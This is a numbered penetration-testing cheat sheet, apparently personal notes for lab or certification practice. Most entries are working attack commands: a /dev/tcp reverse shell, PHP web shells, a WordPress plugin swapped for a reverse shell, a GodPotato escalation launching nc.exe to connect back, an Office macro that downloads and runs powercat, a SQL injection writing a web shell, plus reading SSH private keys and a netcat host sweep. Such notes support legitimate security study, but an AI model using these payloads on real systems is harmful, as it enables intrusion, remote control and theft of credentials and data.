_1)_ Conecting via xfreerdp:

```bash
xfreerdp /u:username /p:password /v:IP
```

_2)_ Using escape character:

```bash
cat script.db | grep "\"vuln\""
```

Search for "vuln". For instance:

![image](https://github.com/user-attachments/assets/59d1e02f-749d-4e70-a2f9-aa6847f638ad)

_3)_ Adding DNS entry:

```bash
sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'
```

_4)_ Decoding/encoding base64

```bash
echo -n "VGhlIGZsYWcgaXM6IE9Te2UxYzRlZDM0ODY2NGEzMDJiNWZmMmEwZjJkZmYzYTU3fQ==" | base64 -d
...
echo -n "Encode this!" | base64
```

_5)_ Connecting via private key

```bash
chmod 400 key.txt
...
ssh -i key.txt username@IP -p <PORT> (22 default)
```

_6)_ SSH keys can be found in:

```bash
cat ~/.ssh/id_rsa
```

_7)_ Testing DT via curl:

```bash
curl -v --path-as-is http://example.com:port/search.php?query=<payload>
```

_8)_ There might be instances when we should use simpler reverse shells. 

Firstly:

```bash
(sh)>0/dev/tcp/IP/PORT
```

Then:

```bash
exec >&0
```

_9)_ php web shell

```php
<?php system($_GET['cmd']); ?>
```

_10)_ Starting a web server:

```bash
python3 -m http.server 8888
```

_11)_ Looking for a file in Windows (equivalent of find in linux):

```powershell
Get-ChildItem -Path C:\ -Include <filename> -File -Recurse -ErrorAction SilentlyContinue
```

_12)_ Finding file location:

```powershell
Get-Process <processname> | format-list path
```

_13)_ Host sweep, if there is no nmap:

```bash
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```

the **-z** flag to check for a listening port without sending data, **-v** for verbosity, and **-w** set to **1** to ensure a _lower time-out threshold_.

_14)_ In wordpress, if we get access to /wp-admin page, we can edit plugins and then get a reverse shell. To do that:
1. replace any plugin (elementor for instance) with reverse shell
2. start a netcat listener (`nc -lnvp 4444`)
3. then access the plugin in /wp-content/plugins/plugin_name/something.php (in our case it is wp-content/plugins/elementor/elementor.php)

_15)_ Transferring files from Windows to Linux:

Kali:

```bash
impacket-smbserver test . -smb2support  -username nazim -password nazim
```

```bash
net use m: \\192.168.45.194\test /user:nazim nazim
copy output.zip m:\
```

_16_)
```bash
.\godpotato -cmd "C:\users\public\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.160 8081"
```

_17)_ Let's say we can execute commands only from smb. No transfers or nc.exe are available. Another way of transferrring a file from Kali to compromised machine and executing is:

On Kali:

```bash
smbserver.py -smb2support evil $PWD
```

On compromised machine through cmd:

```powershell
//kali_ip/evil/shell.exe
```


_18)_ If default commands such as whoami do not work, set $PATH variable:

```powershell
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
```

_19)_ Macros and powercat:

```
Sub Main

	Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.187/powercat.ps1');powercat -c 192.168.45.187 -p 135 -e powershell")

End Sub
```

_20)_ Into outfile

```mysql
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -
```

